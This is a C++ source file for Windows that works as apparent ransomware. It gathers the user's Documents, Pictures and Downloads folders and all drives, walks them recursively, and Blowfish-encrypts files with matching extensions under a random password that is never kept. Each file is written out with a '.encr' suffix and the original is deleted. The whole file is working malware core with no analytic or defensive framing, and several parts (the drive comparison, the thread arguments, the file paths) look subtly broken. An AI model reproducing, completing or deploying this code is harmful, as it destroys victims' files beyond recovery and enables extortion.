#include "FilesHandler.h"

void FilesHandler::updateDriveList()
{
	system("cls");
	std::cout << "Updating list of folders and drives ...";
	CHAR my_documents[MAX_PATH];    /*Adding path to My Documents to the vector of directories*/
	HRESULT Result = SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, SHGFP_TYPE_CURRENT, my_documents);
	if (Result == S_OK) {
		_v_location.push_back(my_documents);
		std::cout << my_documents << "\n";
	}
	CHAR my_pictures[MAX_PATH];	/*Adding path to My Pictures to the vector of directories*/
	Result = SHGetFolderPathA(NULL, CSIDL_MYPICTURES, NULL, SHGFP_TYPE_CURRENT, my_pictures);
	if (Result == S_OK) {
		_v_location.push_back(my_pictures);
		std::cout << my_pictures << "\n";
	}
	WCHAR* folderpath;   /*Adding path to Downloads folder*/
	Result = SHGetKnownFolderPath(FOLDERID_Downloads, 0, NULL, &folderpath);
	char ch[260];
	char DefChar = ' ';
	WideCharToMultiByte(CP_ACP, 0, folderpath, -1, ch, 260, &DefChar, NULL);
	std::string my_downloads(ch);
	_v_location.push_back(my_downloads);
	std::cout << my_downloads << "\n";

	wchar_t szDrives[MAX_PATH];
	if (GetLogicalDriveStrings(MAX_PATH, szDrives))
	{
		wchar_t* pDrive = szDrives;
		while (*pDrive) {
			if (pDrive == L"C:\\") {
			}
			else {
				WideCharToMultiByte(CP_ACP, 0, pDrive, -1, ch, 260, &DefChar, NULL);
				std::string my_path(ch);
				_v_location.push_back(my_path);
				std::cout << my_path << "\n";
			}
			pDrive += wcslen(pDrive) + 1;
		}

	}
	printf(GRN "Done!");
}

void FilesHandler::SearchFile(LPWSTR path)
{
	WIN32_FIND_DATA wfd = { 0 };
	SetCurrentDirectory(path);
	HANDLE search = FindFirstFile(L"*", &wfd);
	if (search == INVALID_HANDLE_VALUE) {
		return;
	}
	do {
		LPWSTR strTmp = (LPWSTR)calloc(MAX_PATH + 1, sizeof(WCHAR));
		GetCurrentDirectory(MAX_PATH, strTmp);
		wcscat_s(strTmp, MAX_PATH, L"\\");
		wcscat_s(strTmp, MAX_PATH, wfd.cFileName);
		LPWSTR strTmp_ = (LPWSTR)calloc(wcslen(strTmp) + 1, sizeof(WCHAR));
		wcscpy_s(strTmp_, wcslen(strTmp) + 1, strTmp);
		if (wcscmp(wfd.cFileName, L".") && wcscmp(wfd.cFileName, L"..")) {
			wcscat_s(strTmp, MAX_PATH, L"\t\t\t");
			if (((wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) && (!(wfd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT))) {
				SearchFile(strTmp_);
				SetCurrentDirectory(path);
			}
			else {
				std::wstring ws = wfd.cFileName;
				std::string tmpString(ws.begin(), ws.end());
				for (int i = 0; i < _v_file_extension.size(); i++) {
					if (tmpString.find(_v_file_extension[i]) != std::string::npos) {
						std::string password = GeneratePassword();
						Encrypt(tmpString, password);
					}
				}
			}
		}
	} while (FindNextFile(search, &wfd));
}

std::string FilesHandler::GeneratePassword()
{

	srand((unsigned)time(NULL) * _getpid());
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";
	std::string tmp_s;
	tmp_s.reserve(PASSWORD_LENGTH);

	for (int i = 0; i < PASSWORD_LENGTH; ++i) {
		tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];
	}

	return tmp_s;
}

void FilesHandler::Encrypt(std::string _filePath, std::string _password)
{
	int length;
	DWORD ByteRet;
	Blowfish blowfish;
	unsigned char key[16];
	std::copy(_password.begin(), _password.end(), key);
	blowfish.SetKey(key, sizeof(key));
	std::string _s_fileName = _filePath;
	std::string tmpString = _filePath;
	tmpString.append(".encr");
	std::ifstream inFile (_s_fileName, std::ios::binary);
	std::ofstream outFile (tmpString, std::ios::binary);
	inFile.seekg(0, std::ios::end);
	length = inFile.tellg();
	char* buf = new char[length + 1];
	inFile.seekg(0, std::ios::beg);
	inFile.read(buf, length);
	char* outBuf = new char[length + 1];
	blowfish.Encrypt((unsigned char*)outBuf, (unsigned char*)buf, length);
	outFile.write(outBuf, length);
	inFile.close();
	outFile.close();
	remove(_s_fileName.c_str());
	delete[] buf;
	delete[] outBuf;
}

bool FilesHandler::StartEncryption()
{
	try{
	updateDriveList();
	}
	catch (int e) {
		std::cout << "Error";
	}
	for (int i = 0; i < _v_location.size(); i++) {
		try {
			std::thread Thread(SearchFile, &_v_location[i]);
			Thread.join();
		}
		catch(int e) {
			printf("ERROR");
		}
	}
	return false;
}
